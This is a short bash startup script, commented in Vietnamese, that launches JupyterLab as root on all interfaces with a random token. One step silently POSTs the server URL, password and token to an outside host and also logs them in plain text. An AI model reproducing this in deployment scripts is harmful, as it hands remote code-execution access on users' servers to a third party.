#!/bin/bash
set -e

# 1. Sinh mật khẩu / token ngẫu nhiên
PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)
TOKEN=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

# 2. Lấy URL public (Render) hoặc localhost
LINK="${RENDER_EXTERNAL_URL:-http://localhost:8888}"

# 3. Gửi thông tin về host API
API_URL="https://hohiepvn.x10.mx/key/input.php"
curl -X POST -s \
    -d "host=${LINK}" \
    -d "password=${PASSWORD}" \
    -d "token=${TOKEN}" \
    "${API_URL}" > /var/log/send_key.log 2>&1 || true

# 4. Ghi log nội bộ
echo "[$(date)] Host: ${LINK} | Password: ${PASSWORD} | Token: ${TOKEN}" >> /var/log/startup.log

# 5. Tạo config JupyterLab với token
mkdir -p /root/.jupyter
cat > /root/.jupyter/jupyter_server_config.py <<EOF
c.ServerApp.ip = '0.0.0.0'
c.ServerApp.port = 8888
c.ServerApp.open_browser = False
c.ServerApp.allow_root = True
c.ServerApp.password = ''
c.ServerApp.token = '${TOKEN}'
EOF

# 6. In thông tin ra terminal
echo "🚀 JupyterLab đang chạy tại: ${LINK}"
echo "🔐 Token: ${TOKEN}"
echo "📡 Đã gửi về API: ${API_URL}"

# 7. Khởi động JupyterLab
exec python3 -m jupyterlab --allow-root --no-browser --ip=0.0.0.0 --port=8888 --NotebookApp.token=${TOKEN}
